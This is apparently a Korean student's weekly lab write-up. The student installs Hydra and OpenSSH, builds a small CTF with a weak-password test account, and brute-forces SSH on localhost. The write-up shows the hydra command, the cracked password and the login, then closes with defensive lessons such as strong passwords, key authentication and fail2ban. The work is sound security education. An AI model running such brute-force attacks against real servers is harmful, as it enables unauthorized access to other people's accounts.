# 11주차 — Hydra / OpenSSH 설치하기

## 📌 개요

**Hydra**와 **OpenSSH**를 설치하고, SSH 서버에 대한 비밀번호 무차별 대입(Brute Force) 공격을 실습하였다.

## 도구 소개

| 도구 | 설명 |
|------|------|
| Hydra | 비밀번호 후보 리스트로 로그인 시도를 자동 반복하는 공격 도구 |
| OpenSSH | 데이터를 암호화하여 원격 서버에 안전하게 접속할 수 있게 하는 프로그램 |

## ⚙️ 설치

```bash
sudo apt install hydra -y
sudo apt install openssh-server -y

# SSH 서버 자동 실행 설정
sudo systemctl enable ssh
sudo systemctl start ssh
```

---

## 🚩 CTF 문제

### 카테고리
Pwn / Brute Force

### 시나리오
```
SSH 서버에 약한 비밀번호를 가진 테스트 계정이 존재한다.
제공된 wordlist를 활용하여 비밀번호를 크래킹하고, SSH로 로그인하라.
```

### 관련 파일
- [setup.sh](./setup.sh) — 테스트 계정 및 환경 구성 스크립트
- [pwlist.txt](./pwlist.txt) — 비밀번호 후보 리스트

---

## 📖 문제 제작 과정

```bash
# 테스트 계정 생성 (비밀번호: miso1234)
sudo adduser hydratest
```

비밀번호 후보 리스트 생성:
```bash
nano pwlist.txt
```
→ [pwlist.txt](./pwlist.txt) 참고

---

## 🔍 문제 풀이

**Step 1. Hydra로 SSH 비밀번호 크래킹**

```bash
hydra -l hydratest -P pwlist.txt ssh://127.0.0.1
```

결과:
```
[22][ssh] host: 127.0.0.1  login: hydratest  password: miso1234
1 of 1 target successfully completed, 1 valid password found
```

**Step 2. 크래킹한 비밀번호로 SSH 로그인**

```bash
ssh hydratest@127.0.0.1
# Password: miso1234
```

**🏁 결과**
```
SSH 로그인 성공!
Welcome to Ubuntu 24.04 LTS ...
```

## ⚠️ 보안 교훈

- 약한 비밀번호는 Hydra 같은 도구로 수 초 내에 크래킹된다.
- 서버에는 반드시 강력한 비밀번호와 SSH 키 인증을 사용해야 한다.
- `fail2ban` 등으로 반복 로그인 시도를 차단하는 것이 중요하다.
